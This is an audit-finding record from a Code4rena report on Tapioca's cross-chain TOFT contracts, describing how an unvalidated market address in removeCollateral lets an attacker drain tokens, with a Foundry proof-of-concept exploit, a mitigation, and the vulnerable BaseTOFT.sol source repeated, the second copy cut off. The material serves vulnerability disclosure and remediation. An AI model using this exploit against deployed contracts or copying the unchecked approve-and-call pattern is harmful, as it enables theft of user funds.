{
  "Title": "[H-01] TOFT in (m)TapiocaOft contracts can be stolen by calling removeCollateral() with a malicious removeParams.market",
  "Content": "\n<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/BaseTOFT.sol#L190> \n\n<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/BaseTOFT.sol#L516> \n\n<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L230-L231>\n\nThe `TOFT` available in the `TapiocaOFT` contract can be stolen when calling `removeCollateral()` with a malicious market.\n\n### Proof of Concept\n\n`(m)TapiocaOFT` inherit `BaseTOFT`, which has a function `removeCollateral()` that accepts a market address as an argument. This function calls `_lzSend()` internally on the source chain, which then is forwarded to the destination chain by the relayer and calls `lzReceive()`.\n\n`lzReceive()` reaches `_nonBlockingLzReceive()` in `BaseTOFT` and delegate calls to the `BaseTOFTMarketModule` on function `remove()`. This function approves `TOFT` to the `removeParams.market`  and then calls function `removeCollateral()` of the provided market. There is no validation whatsoever in this address, such that a malicious market can be provided that steals all funds, as can be seen below:\n\n```solidity\nfunction remove(bytes memory _payload) public {\n    ...\n    approve(removeParams.market, removeParams.share); // no validation prior to this 2 calls\n    IMarket(removeParams.market).removeCollateral(\n        to,\n        to,\n        removeParams.share\n    );\n    ...\n}\n```\n\nThe following POC in Foundry demonstrates this vulnerability, the attacker is able to steal all `TOFT` in `mTapiocaOFT`:\n\n<details>\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.18;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\nimport {TapiocaOFT} from \"contracts/tOFT/TapiocaOFT.sol\";\nimport {BaseTOFTMarketModule} from \"contracts/tOFT/modules/BaseTOFTMarketModule.sol\";\n\nimport {IYieldBoxBase} from \"tapioca-periph/contracts/interfaces/IYieldBoxBase.sol\";\nimport {ISendFrom} from \"tapioca-periph/contracts/interfaces/ISendFrom.sol\";\nimport {ICommonData} from \"tapioca-periph/contracts/interfaces/ICommonData.sol\";\nimport {ITapiocaOFT} from \"tapioca-periph/contracts/interfaces/ITapiocaOFT.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ncontract MaliciousMarket {\n    address public immutable attacker;\n    address public immutable tapiocaOft;\n\n    constructor(address attacker_, address tapiocaOft_) {\n        attacker = attacker_;\n        tapiocaOft = tapiocaOft_;\n    } \n\n    function removeCollateral(address, address, uint256 share) external {\n        IERC20(tapiocaOft).transferFrom(msg.sender, attacker, share);\n    }\n}\n\ncontract TapiocaOFTPOC is Test {\n    address public constant LZ_ENDPOINT = 0x66A71Dcef29A0fFBDBE3c6a460a3B5BC225Cd675;\n    uint16 internal constant PT_MARKET_REMOVE_COLLATERAL = 772;\n\n    function test_POC_StealAllAssetsInTapiocaOFT_RemoveCollateral_MaliciousMarket()\n        public\n    {\n        vm.createSelectFork(\"https://eth.llamarpc.com\");\n\n        address marketModule_ = address(\n            new BaseTOFTMarketModule(\n                address(LZ_ENDPOINT),\n                address(0),\n                IYieldBoxBase(address(2)),\n                \"SomeName\",\n                \"SomeSymbol\",\n                18,\n                block.chainid\n            )\n        );\n\n        TapiocaOFT tapiocaOft_ = new TapiocaOFT(\n            LZ_ENDPOINT,\n            address(0),\n            IYieldBoxBase(address(3)),\n            \"SomeName\",\n            \"SomeSymbol\",\n            18,\n            block.chainid,\n            payable(address(1)),\n            payable(address(2)),\n            payable(marketModule_),\n            payable(address(4))\n        );\n\n        // TOFT is acummulated in the TapiocaOft contract and can be stolen by the malicious market\n        // for example, strategyDeposit of the BaseTOFTMarketModule credits TOFT to tapiocaOft\n        uint256 tOftInTapiocaOft_ = 1 ether;\n        deal(address(tapiocaOft_), address(tapiocaOft_), tOftInTapiocaOft_);\n\n        address attacker_ = makeAddr(\"attacker\");\n        deal(attacker_, 1 ether); // lz fees\n\n        uint16 lzDstChainId_ = 102;\n        address zroPaymentAddress_ = address(0);\n        ICommonData.IWithdrawParams memory withdrawParams_;\n        ITapiocaOFT.IRemoveParams memory removeParams_;\n        removeParams_.share = tOftInTapiocaOft_;\n        removeParams_.market = address(new MaliciousMarket(attacker_, address(tapiocaOft_)));\n        ICommonData.IApproval[] memory approvals_;\n        bytes memory adapterParams_;\n\n        tapiocaOft_.setTrustedRemoteAddress(lzDstChainId_, abi.encodePacked(tapiocaOft_));\n\n        vm.prank(attacker_);\n        tapiocaOft_.removeCollateral{value: 1 ether}(\n            attacker_,\n            attacker_,\n            lzDstChainId_,\n            zroPaymentAddress_,\n            withdrawParams_,\n            removeParams_,\n            approvals_,\n            adapterParams_\n        );\n\n        bytes memory lzPayload_ = abi.encode(\n            PT_MARKET_REMOVE_COLLATERAL,\n            attacker_,\n            attacker_,\n            bytes32(bytes20(attacker_)),\n            removeParams_,\n            withdrawParams_,\n            approvals_\n        );\n\n        vm.prank(LZ_ENDPOINT);\n        tapiocaOft_.lzReceive(lzDstChainId_, abi.encodePacked(tapiocaOft_, tapiocaOft_), 0, lzPayload_);\n        assertEq(tapiocaOft_.balanceOf(attacker_), tOftInTapiocaOft_);\n    }\n}\n```\n\n</details>\n\n### Tools Used\n\nVscode, Foundry\n\n### Recommended Mitigation Steps\n\nWhitelist the `removeParams.market` address to prevent users from providing malicious markets.\n\n**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1695#issuecomment-1697852377)**\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2023-07-tapioca",
  "Code": [
    {
      "filename": "contracts/tOFT/BaseTOFT.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.18;\n\nimport \"./BaseTOFTStorage.sol\";\n\n//TOFT MODULES\nimport \"./modules/BaseTOFTLeverageModule.sol\";\nimport \"./modules/BaseTOFTStrategyModule.sol\";\nimport \"./modules/BaseTOFTMarketModule.sol\";\nimport \"./modules/BaseTOFTOptionsModule.sol\";\n\n/// @title BaseTOFT contract \n/// @notice Common tOFT capabilitites\n/// @dev all LayerZero methods are defined here\ncontract BaseTOFT is BaseTOFTStorage, ERC20Permit {\n    using SafeERC20 for IERC20;\n    using BytesLib for bytes;\n\n    // ************ //\n    // *** VARS *** //\n    // ************ //\n    enum Module {\n        Leverage,\n        Strategy,\n        Market,\n        Options\n    }\n\n    /// @notice returns the leverage module\n    BaseTOFTLeverageModule public leverageModule;\n\n    /// @notice returns the Strategy module\n    BaseTOFTStrategyModule public strategyModule;\n\n    /// @notice returns the Market module\n    BaseTOFTMarketModule public marketModule;\n\n    /// @notice returns the Options module\n    BaseTOFTOptionsModule public optionsModule;\n\n    // ******************//\n    // *** MODIFIERS *** //\n    // ***************** //\n    /// @notice Require that the caller is on the host chain of the ERC20.\n    modifier onlyHostChain() {\n        require(block.chainid == hostChainID, \"TOFT_host\");\n        _;\n    }\n\n    constructor(\n        address _lzEndpoint,\n        address _erc20,\n        IYieldBoxBase _yieldBox,\n        string memory _name,\n        string memory _symbol,\n        uint8 _decimal,\n        uint256 _hostChainID,\n        address payable _leverageModule,\n        address payable _strategyModule,\n        address payable _marketModule,\n        address payable _optionsModule\n    )\n        BaseTOFTStorage(\n            _lzEndpoint,\n            _erc20,\n            _yieldBox,\n            _name,\n            _symbol,\n            _decimal,\n            _hostChainID\n        )\n        ERC20Permit(string(abi.encodePacked(\"TapiocaOFT-\", _name)))\n    {\n        leverageModule = BaseTOFTLeverageModule(_leverageModule);\n        strategyModule = BaseTOFTStrategyModule(_strategyModule);\n        marketModule = BaseTOFTMarketModule(_marketModule);\n        optionsModule = BaseTOFTOptionsModule(_optionsModule);\n    }\n\n    // ********************** //\n    // *** VIEW FUNCTIONS *** //\n    // ********************** //\n    /// @notice decimal number of the ERC20\n    function decimals() public view override returns (uint8) {\n        if (_decimalCache == 0) return 18; //temporary fix for LZ _sharedDecimals check\n        return _decimalCache;\n    }\n\n    // ************************ //\n    // *** PUBLIC FUNCTIONS *** //\n    // ************************ //\n    /// @notice triggers a sendFrom to another layer from destination\n    /// @param lzDstChainId LZ destination id\n    /// @param airdropAdapterParams airdrop params\n    /// @param zroPaymentAddress ZRO payment address\n    /// @param amount amount to send back\n    /// @param sendFromData data needed to trigger sendFrom on destination\n    /// @param approvals approvals array\n    function triggerSendFrom(\n        uint16 lzDstChainId,\n        bytes calldata airdropAdapterParams,\n        address zroPaymentAddress,\n        uint256 amount,\n        ISendFrom.LzCallParams calldata sendFromData,\n        ICommonData.IApproval[] calldata approvals\n    ) external payable {\n        _executeModule(\n            Module.Options,\n            abi.encodeWithSelector(\n                BaseTOFTOptionsModule.triggerSendFrom.selector,\n                lzDstChainId,\n                airdropAdapterParams,\n                zroPaymentAddress,\n                amount,\n                sendFromData,\n                approvals\n            ),\n            false\n        );\n    }\n\n    /// @notice Exercise an oTAP position\n    /// @param optionsData oTap exerciseOptions data\n    /// @param lzData data needed for the cross chain transer\n    /// @param tapSendData needed for withdrawing Tap token\n    /// @param approvals array\n    function exerciseOption(\n        ITapiocaOptionsBrokerCrossChain.IExerciseOptionsData\n            calldata optionsData,\n        ITapiocaOptionsBrokerCrossChain.IExerciseLZData calldata lzData,\n        ITapiocaOptionsBrokerCrossChain.IExerciseLZSendTapData\n            calldata tapSendData,\n        ICommonData.IApproval[] calldata approvals\n    ) external payable {\n        _executeModule(\n            Module.Options,\n            abi.encodeWithSelector(\n                BaseTOFTOptionsModule.exerciseOption.selector,\n                optionsData,\n                lzData,\n                tapSendData,\n                approvals\n            ),\n            false\n        );\n    }\n\n    /// @notice inits a multiHopSellCollateral call\n    /// @param from The user who sells\n    /// @param share Collateral YieldBox-shares to sell\n    /// @param swapData Swap data used on destination chain for swapping USDO to the underlying TOFT token\n    /// @param lzData LayerZero specific data\n    /// @param externalData External contracts used for the cross chain operation\n    /// @param airdropAdapterParams default or airdrop adapter params\n    /// @param approvals array\n    function initMultiSell(\n        address from,\n        uint256 share,\n        IUSDOBase.ILeverageSwapData calldata swapData,\n        IUSDOBase.ILeverageLZData calldata lzData,\n        IUSDOBase.ILeverageExternalContractsData calldata externalData,\n        bytes calldata airdropAdapterParams,\n        ICommonData.IApproval[] memory approvals\n    ) external payable {\n        _executeModule(\n            Module.Leverage,\n            abi.encodeWithSelector(\n                BaseTOFTLeverageModule.initMultiSell.selector,\n                from,\n                share,\n                swapData,\n                lzData,\n                externalData,\n                airdropAdapterParams,\n                approvals\n            ),\n            false\n        );\n    }\n\n    /// @notice calls removeCollateral on another layer\n    /// @param from sending address\n    /// @param to receiver address\n    /// @param lzDstChainId LayerZero destination chain id\n    /// @param zroPaymentAddress LayerZero ZRO payment address\n    /// @param withdrawParams withdrawTo specific params\n    /// @param removeParams removeAsset specific params\n    /// @param approvals approvals specific params\n    /// @param adapterParams LZ adapter params\n    function removeCollateral(\n        address from,\n        address to,\n        uint16 lzDstChainId,\n        address zroPaymentAddress,\n        ICommonData.IWithdrawParams calldata withdrawParams,\n        ITapiocaOFT.IRemoveParams calldata removeParams,\n        ICommonData.IApproval[] calldata approvals,\n        bytes calldata adapterParams\n    ) external payable {\n        _executeModule(\n            Module.Market,\n            abi.encodeWithSelector(\n                BaseTOFTMarketModule.removeCollateral.selector,\n                from,\n                to,\n                lzDstChainId,\n                zroPaymentAddress,\n                withdrawParams,\n                removeParams,\n                approvals,\n                adapterParams\n            ),\n            false\n        );\n    }\n\n    /// @notice sends TOFT to a specific strategy available on another layer\n    /// @param from the sender address\n    /// @param to the receiver address\n    /// @param amount the transferred amount\n    /// @param assetId the destination YieldBox asset id\n    /// @param lzDstChainId the destination LayerZero id\n    /// @param options the operation data\n    function sendToStrategy(\n        address from,\n        address to,\n        uint256 amount,\n        uint256 share,\n        uint256 assetId,\n        uint16 lzDstChainId,\n        ICommonData.ISendOptions calldata options\n    ) external payable {\n        _executeModule(\n            Module.Strategy,\n            abi.encodeWithSelector(\n                BaseTOFTStrategyModule.sendToStrategy.selector,\n                from,\n                to,\n                amount,\n                share,\n                assetId,\n                lzDstChainId,\n                options\n            ),\n            false\n        );\n    }\n\n    /// @notice extracts TOFT from a specific strategy available on another layer\n    /// @param from the sender address\n    /// @param amount the transferred amount\n    /// @param assetId the destination YieldBox asset id\n    /// @param lzDstChainId the destination LayerZero id\n    /// @param zroPaymentAddress LayerZero ZRO payment address\n    /// @param airdropAdapterParam the LayerZero aidrop adapter params\n    function retrieveFromStrategy(\n        address from,\n        uint256 amount,\n        uint256 share,\n        uint256 assetId,\n        uint16 lzDstChainId,\n        address zroPaymentAddress,\n        bytes memory airdropAdapterParam\n    ) external payable {\n        _executeModule(\n            Module.Strategy,\n            abi.encodeWithSelector(\n                BaseTOFTStrategyModule.retrieveFromStrategy.selector,\n                from,\n                amount,\n                share,\n                assetId,\n                lzDstChainId,\n                zroPaymentAddress,\n                airdropAdapterParam\n            ),\n            false\n        );\n    }\n\n    /// @notice sends TOFT to a specific chain and performs a borrow operation\n    /// @param from the sender address\n    /// @param to the receiver address\n    /// @param lzDstChainId the destination LayerZero id\n    /// @param airdropAdapterParams the LayerZero aidrop adapter params\n    /// @param borrowParams the borrow operation data\n    /// @param withdrawParams the withdraw operation data\n    /// @param options the cross chain send operation data\n    /// @param approvals the cross chain approval operation data\n    function sendToYBAndBorrow(\n        address from,\n        address to,\n        uint16 lzDstChainId,\n        bytes calldata airdropAdapterParams,\n        ITapiocaOFT.IBorrowParams calldata borrowParams,\n        ICommonData.IWithdrawParams calldata withdrawParams,\n        ICommonData.ISendOptions calldata options,\n        ICommonData.IApproval[] calldata approvals\n    ) external payable {\n        _executeModule(\n            Module.Market,\n            abi.encodeWithSelector(\n                BaseTOFTMarketModule.sendToYBAndBorrow.selector,\n                from,\n                to,\n                lzDstChainId,\n                airdropAdapterParams,\n                borrowParams,\n                withdrawParams,\n                options,\n                approvals\n            ),\n            false\n        );\n    }\n\n    /// @notice sends TOFT to a specific chain and performs a leverage down operation\n    /// @param amount the amount to use\n    /// @param leverageFor the receiver address\n    /// @param lzData LZ specific data\n    /// @param swapData ISwapper specific data\n    /// @param externalData external contracts used for the flow\n    function sendForLeverage(\n        uint256 amount,\n        address leverageFor,\n        IUSDOBase.ILeverageLZData calldata lzData,\n        IUSDOBase.ILeverageSwapData calldata swapData,\n        IUSDOBase.ILeverageExternalContractsData calldata externalData\n    ) external payable {\n        _executeModule(\n            Module.Leverage,\n            abi.encodeWithSelector(\n                BaseTOFTLeverageModule.sendForLeverage.selector,\n                amount,\n                leverageFor,\n                lzData,\n                swapData,\n                externalData\n            ),\n            false\n        );\n    }\n\n    // ************************* //\n    // *** PRIVATE FUNCTIONS *** //\n\n    //---internal-\n    function _wrap(\n        address _fromAddress,\n        address _toAddress,\n        uint256 _amount\n    ) internal virtual {\n        if (_fromAddress != msg.sender) {\n            require(\n                allowance(_fromAddress, msg.sender) >= _amount,\n                \"TOFT_allowed\"\n            );\n        }\n        IERC20(erc20).safeTransferFrom(_fromAddress, address(this), _amount);\n        _mint(_toAddress, _amount);\n    }\n\n    function _wrapNative(address _toAddress) internal virtual {\n        require(msg.value > 0, \"TOFT_0\");\n        _mint(_toAddress, msg.value);\n    }\n\n    function _unwrap(address _toAddress, uint256 _amount) internal virtual {\n        _burn(msg.sender, _amount);\n\n        if (erc20 == address(0)) {\n            _safeTransferETH(_toAddress, _amount);\n        } else {\n            IERC20(erc20).safeTransfer(_toAddress, _amount);\n        }\n    }\n\n    //---private---\n    function _safeTransferETH(address to, uint256 amount) internal {\n        (bool sent, ) = to.call{value: amount}(\"\");\n        require(sent, \"TOFT_failed\");\n    }\n\n    function _extractModule(Module _module) private view returns (address) {\n        address module;\n        if (_module == Module.Leverage) {\n            module = address(leverageModule);\n        } else if (_module == Module.Strategy) {\n            module = address(strategyModule);\n        } else if (_module == Module.Market) {\n            module = address(marketModule);\n        } else if (_module == Module.Options) {\n            module = address(optionsModule);\n        }\n\n        if (module == address(0)) {\n            revert(\"TOFT_module\");\n        }\n\n        return module;\n    }\n\n    function _executeModule(\n        Module _module,\n        bytes memory _data,\n        bool _forwardRevert\n    ) private returns (bool success, bytes memory returnData) {\n        success = true;\n        address module = _extractModule(_module);\n\n        (success, returnData) = module.delegatecall(_data);\n        if (!success && !_forwardRevert) {\n            revert(_getRevertMsg(returnData));\n        }\n    }\n\n    function _executeOnDestination(\n        Module _module,\n        bytes memory _data,\n        uint16 _srcChainId,\n        bytes memory _srcAddress,\n        uint64 _nonce,\n        bytes memory _payload\n    ) private {\n        (bool success, bytes memory returnData) = _executeModule(\n            _module,\n            _data,\n            true\n        );\n        if (!success) {\n            _storeFailedMessage(\n                _srcChainId,\n                _srcAddress,\n                _nonce,\n                _payload,\n                returnData\n            );\n        }\n    }\n\n    //---LZ---\n    function _nonblockingLzReceive(\n        uint16 _srcChainId,\n        bytes memory _srcAddress,\n        uint64 _nonce,\n        bytes memory _payload\n    ) internal virtual override {\n        uint256 packetType = _payload.toUint256(0);\n\n        if (packetType == PT_YB_SEND_STRAT) {\n            _executeOnDestination(\n                Module.Strategy,\n                abi.encodeWithSelector(\n                    BaseTOFTStrategyModule.strategyDeposit.selector,\n                    strategyModule,\n                    _srcChainId,\n                    _srcAddress,\n                    _nonce,\n                    _payload,\n                    IERC20(address(this))\n                ),\n                _srcChainId,\n                _srcAddress,\n                _nonce,\n                _payload\n            );\n        } else if (packetType == PT_YB_RETRIEVE_STRAT) {\n            _executeOnDestination(\n                Module.Strategy,\n                abi.encodeWithSelector(\n                    BaseTOFTStrategyModule.strategyWithdraw.selector,\n                    _srcChainId,\n                    _payload\n                ),\n                _srcChainId,\n                _srcAddress,\n                _nonce,\n                _payload\n            );\n        } else if (packetType == PT_LEVERAGE_MARKET_DOWN) {\n            _executeOnDestination(\n                Module.Leverage,\n                abi.encodeWithSelector(\n                    BaseTOFTLeverageModule.leverageDown.selector,\n                    leverageModule,\n                    _srcChainId,\n                    _srcAddress,\n                    _nonce,\n                    _payload\n                ),\n                _srcChainId,\n                _srcAddress,\n                _nonce,\n                _payload\n            );\n        } else if (packetType == PT_YB_SEND_SGL_BORROW) {\n            _executeOnDestination(\n                Module.Market,\n                abi.encodeWithSelector(\n                    BaseTOFTMarketModule.borrow.selector,\n                    marketModule,\n                    _srcChainId,\n                    _srcAddress,\n                    _nonce,\n                    _payload\n                ),\n                _srcChainId,\n                _srcAddress,\n                _nonce,\n                _payload\n            );\n        } else if (packetType == PT_MARKET_REMOVE_COLLATERAL) {\n            _executeOnDestination(\n                Module.Market,\n                abi.encodeWithSelector(\n                    BaseTOFTMarketModule.remove.selector,\n                    _payload\n                ),\n                _srcChainId,\n                _srcAddress,\n                _nonce,\n                _payload\n            );\n        } else if (packetType == PT_MARKET_MULTIHOP_SELL) {\n            _executeOnDestination(\n                Module.Leverage,\n                abi.encodeWithSelector(\n                    BaseTOFTLeverageModule.multiHop.selector,\n                    _payload\n                ),\n                _srcChainId,\n                _srcAddress,\n                _nonce,\n                _payload\n            );\n        } else if (packetType == PT_TAP_EXERCISE) {\n            _executeOnDestination(\n                Module.Options,\n                abi.encodeWithSelector(\n                    BaseTOFTOptionsModule.exercise.selector,\n                    _srcChainId,\n                    _srcAddress,\n                    _nonce,\n                    _payload\n                ),\n                _srcChainId,\n                _srcAddress,\n                _nonce,\n                _payload\n            );\n        } else if (packetType == PT_SEND_FROM) {\n            _executeOnDestination(\n                Module.Options,\n                abi.encodeWithSelector(\n                    BaseTOFTOptionsModule.sendFromDestination.selector,\n                    _payload\n                ),\n                _srcChainId,\n                _srcAddress,\n                _nonce,\n                _payload\n            );\n        } else {\n            packetType = _payload.toUint8(0);\n            if (packetType == PT_SEND) {\n                _sendAck(_srcChainId, _srcAddress, _nonce, _payload);\n            } else if (packetType == PT_SEND_AND_CALL) {\n                _sendAndCallAck(_srcChainId, _srcAddress, _nonce, _payload);\n            } else {\n                revert(\"TOFT_packet\");\n            }\n        }\n    }\n}"
    },
    {
      "filename": "contracts/tOFT/BaseTOFT.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.18;\n\nimport \"./BaseTOFTStorage.sol\";\n\n//TOFT MODULES\nimport \"./modules/BaseTOFTLeverageModule.sol\";\nimport \"./modules/BaseTOFTStrategyModule.sol\";\nimport \"./modules/BaseTOFTMarketModule.sol\";\nimport \"./modules/BaseTOFTOptionsModule.sol\";\n\n/// @title BaseTOFT contract \n/// @notice Common tOFT capabilitites\n/// @dev all LayerZero methods are defined here\ncontract BaseTOFT is BaseTOFTStorage, ERC20Permit {\n    using SafeERC20 for IERC20;\n    using BytesLib for bytes;\n\n    // ************ //\n    // *** VARS *** //\n    // ************ //\n    enum Module {\n        Leverage,\n        Strategy,\n        Market,\n        Options\n    }\n\n    /// @notice returns the leverage module\n    BaseTOFTLeverageModule public leverageModule;\n\n    /// @notice returns the Strategy module\n    BaseTOFTStrategyModule public strategyModule;\n\n    /// @notice returns the Market module\n    BaseTOFTMarketModule public marketModule;\n\n    /// @notice returns the Options module\n    BaseTOFTOptionsModule public optionsModule;\n\n    // ******************//\n    // *** MODIFIERS *** //\n    // ***************** //\n    /// @notice Require that the caller is on the host chain of the ERC20.\n    modifier onlyHostChain() {\n        require(block.chainid == hostChainID, \"TOFT_host\");\n        _;\n    }\n\n    constructor(\n        address _lzEndpoint,\n        address _erc20,\n        IYieldBoxBase _yieldBox,\n        string memory _name,\n        string memory _symbol,\n        uint8 _decimal,\n        uint256 _hostChainID,\n        address payable _leverageModule,\n        address payable _strategyModule,\n        address payable _marketModule,\n        address payable _optionsModule\n    )\n        BaseTOFTStorage(\n            _lzEndpoint,\n            _erc20,\n            _yieldBox,\n            _name,\n            _symbol,\n            _decimal,\n            _hostChainID\n        )\n        ERC20Permit(string(abi.encodePacked(\"TapiocaOFT-\", _name)))\n    {\n        leverageModule = BaseTOFTLeverageModule(_leverageModule);\n        strategyModule = BaseTOFTStrategyModule(_strategyModule);\n        marketModule = BaseTOFTMarketModule(_marketModule);\n        optionsModule = BaseTOFTOptionsModule(_optionsModule);\n    }\n\n    // ********************** //\n    // *** VIEW FUNCTIONS *** //\n    // ********************** //\n    /// @notice decimal number of the ERC20\n    function decimals() public view override returns (uint8) {\n        if (_decimalCache == 0) return 18; //temporary fix for LZ _sharedDecimals check\n        return _decimalCache;\n    }\n\n    // ************************ //\n    // *** PUBLIC FUNCTIONS *** //\n    // ************************ //\n    /// @notice triggers a sendFrom to another layer from destination\n    /// @param lzDstChainId LZ destination id\n    /// @param airdropAdapterParams airdrop params\n    /// @param zroPaymentAddress ZRO payment address\n    /// @param amount amount to send back\n    /// @param sendFromData data needed to trigger sendFrom on destination\n    /// @param approvals approvals array\n    function triggerSendFrom(\n        uint16 lzDstChainId,\n        bytes calldata airdropAdapterParams,\n        address zroPaymentAddress,\n        uint256 amount,\n        ISendFrom.LzCallParams calldata sendFromData,\n        ICommonData.IApproval[] calldata approvals\n    ) external payable {\n        _executeModule(\n            Module.Options,\n            abi.encodeWithSelector(\n                BaseTOFTOptionsModule.triggerSendFrom.selector,\n                lzDstChainId,\n                airdropAdapterParams,\n                zroPaymentAddress,\n                amount,\n                sendFromData,\n                approvals\n            ),\n            false\n        );\n    }\n\n    /// @notice Exercise an oTAP position\n    /// @param optionsData oTap exerciseOptions data\n    /// @param lzData data needed for the cross chain transer\n    /// @param tapSendData needed for withdrawing Tap token\n    /// @param approvals array\n    function exerciseOption(\n        ITapiocaOptionsBrokerCrossChain.IExerciseOptionsData\n            calldata optionsData,\n        ITapiocaOptionsBrokerCrossChain.IExerciseLZData calldata lzData,\n        ITapiocaOptionsBrokerCrossChain.IExerciseLZSendTapData\n            calldata tapSendData,\n        ICommonData.IApproval[] calldata approvals\n    ) external payable {\n        _executeModule(\n            Module.Options,\n            abi.encodeWithSelector(\n                BaseTOFTOptionsModule.exerciseOption.selector,\n                optionsData,\n                lzData,\n                tapSendData,\n                approvals\n            ),\n            false\n        );\n    }\n\n    /// @notice inits a multiHopSellCollateral call\n    /// @param from The user who sells\n    /// @param share Collateral YieldBox-shares to sell\n    /// @param swapData Swap data used on destination chain for swapping USDO to the underlying TOFT token\n    /// @param lzData LayerZero specific data\n    /// @param externalData External contracts used for the cross chain operation\n    /// @param airdropAdapterParams default or airdrop adapter params\n    /// @param approvals array\n    function initMultiSell(\n        address from,\n        uint256 share,\n        IUSDOBase.ILeverageSwapData calldata swapData,\n        IUSDOBase.ILeverageLZData calldata lzData,\n        IUSDOBase.ILeverageExternalContractsData calldata externalData,\n        bytes calldata airdropAdapterParams,\n        ICommonData.IApproval[] memory approvals\n    ) external payable {\n        _executeModule(\n            Module.Leverage,\n            abi.encodeWithSelector(\n                BaseTOFTLeverageModule.initMultiSell.selector,\n                from,\n                share,\n                swapData,\n                lzData,\n                externalData,\n                airdropAdapterParams,\n                approvals\n            ),\n            false\n        );\n    }\n\n    /// @notice calls removeCollateral on another layer\n    /// @param from sending address\n    /// @param to receiver address\n    /// @param lzDstChainId LayerZero destination chain id\n    /// @param zroPaymentAddress LayerZero ZRO payment address\n    /// @param withdrawParams withdrawTo specific params\n    /// @param removeParams removeAsset specific params\n    /// @param approvals approvals specific params\n    /// @param adapterParams LZ adapter params\n    function removeCollateral(\n        address from,\n        address to,\n        uint16 lzDstChainId,\n        address zroPaymentAddress,\n        ICommonData.IWithdrawParams calldata withdrawParams,\n        ITapiocaOFT.IRemoveParams calldata removeParams,\n        ICommonData.IApproval[] calldata approvals,\n        bytes calldata adapterParams\n    ) external payable {\n        _executeModule(\n            Module.Market,\n            abi.encodeWithSelector(\n                BaseTOFTMarketModule.removeCollateral.selector,\n                from,\n                to,\n                lzDstChainId,\n                zroPaymentAddress,\n                withdrawParams,\n                removeParams,\n                approvals,\n                adapterParams\n            ),\n            false\n        );\n    }\n\n    /// @notice sends TOFT to a specific strategy available on another layer\n    /// @param from the sender address\n    /// @param to the receiver address\n    /// @param amount the transferred amount\n    /// @param assetId the destination YieldBox asset id\n    /// @param lzDstChainId the destination LayerZero id\n    /// @param options the operation data\n    function sendToStrategy(\n        address from,\n        address to,\n        uint256 amount,\n        uint256 share,\n        uint256 assetId,\n        uint16 lzDstChainId,\n        ICommonData.ISendOptions calldata options\n    ) external payable {\n        _executeModule(\n            Module.Strategy,\n            abi.encodeWithSelector(\n                BaseTOFTStrategyModule.sendToStrategy.selector,\n                from,\n                to,\n                amount,\n                share,\n                assetId,\n                lzDstChainId,\n                options\n            ),\n            false\n        );\n    }\n\n    /// @notice extracts TOFT from a specific strategy available on another layer\n    /// @param from the sender address\n    /// @param amount the transferred amount\n    /// @param assetId the destination YieldBox asset id\n    /// @param lzDstChainId the destination LayerZero id\n    /// @param zroPaymentAddress LayerZero ZRO payment address\n    /// @param airdropAdapterParam the LayerZero aidrop adapter params\n    function retrieveFromStrategy(\n        address from,\n        uint256 amount,\n        uint256 share,\n        uint256 assetId,\n        uint16 lzDstChainId,\n        address zroPaymentAddress,\n        bytes memory airdropAdapterParam\n    ) external payable {\n        _executeModule(\n            Module.Strategy,\n            abi.encodeWithSelector(\n                BaseTOFTStrategyModule.retrieveFromStrategy.selector,\n                from,\n                amount,\n                share,\n                assetId,\n                lzDstChainId,\n                zroPaymentAddress,\n                airdropAdapterParam\n            ),\n            false\n        );\n    }\n\n    /// @notice sends TOFT to a specific chain and performs a borrow operation\n    /// @param from the sender address\n    /// @param to the receiver address\n    /// @param lzDstChainId the destination LayerZero id\n    /// @param airdropAdapterParams the LayerZero aidrop adapter params\n    /// @param borrowParams the borrow operation data\n    /// @param withdrawParams the withdraw operation data\n    /// @param options the cross chain send operation data\n    /// @param approvals the cross chain approval operation data\n    function sendToYBAndBorrow(\n        address from,\n        address to,\n        uint16 lzDstChainId,\n        bytes calldata airdropAdapterParams,\n        ITapiocaOFT.IBorrowParams calldata borrowParams,\n        ICommonData.IWithdrawParams calldata withdrawParams,\n        ICommonData.ISendOptions calldata options,\n        ICommonData.IApproval[] calldata approvals\n    ) external payable {\n        _executeModule(\n            Module.Market,\n            abi.encodeWithSelector(\n                BaseTOFTMarketModule.sendToYBAndBorrow.selector,\n                from,\n                to,\n                lzDstChainId,\n                airdropAdapterParams,\n                borrowParams,\n                withdrawParams,\n                options,\n                approvals\n            ),\n            false\n        );\n    }\n\n    /// @notice sends TOFT to a specific chain and performs a leverage down operation\n    /// @param amount the amount to use\n    /// @param leverageFor the receiver address\n    /// @param lzData LZ specific data\n    /// @param swapData ISwapper specific data\n    /// @param externalData external contracts used for the flow\n    function sendForLeverage(\n        uint256 amount,\n        address leverageFor,\n        IUSDOBase.ILeverageLZData calldata lzData,\n        IUSDOBase.ILeverageSwapData calldata swapData,\n        IUSDOBase.ILeverageExternalContractsData calldata externalData\n    ) external payable {\n        _executeModule(\n            Module.Leverage,\n            abi.encodeWithSelector(\n                BaseTOFTLeverageModule.sendForLeverage.selector,\n                amount,\n                leverageFor,\n                lzData,\n                swapData,\n                externalData\n            ),\n            false\n        );\n    }\n\n    // ************************* //\n    // *** PRIVATE FUNCTIONS *** //\n\n    //---internal-\n    function _wrap(\n        address _fromAddress,\n        address _toAddress,\n        uint256 _amount\n    ) internal virtual {\n        if (_fromAddress != msg.sender) {\n            require(\n                allowance(_fromAddress, msg.sender) >= _amount,\n                \"TOFT_allowed\"\n            );\n        }\n        IERC20(erc20).safeTransferFrom(_fromAddress, address(this), _amount);\n        _mint(_toAddress, _amount);\n    }\n\n    function _wrapNative(address _toAddress) internal virtual {\n        require(msg.value > 0, \"TOFT_0\");\n        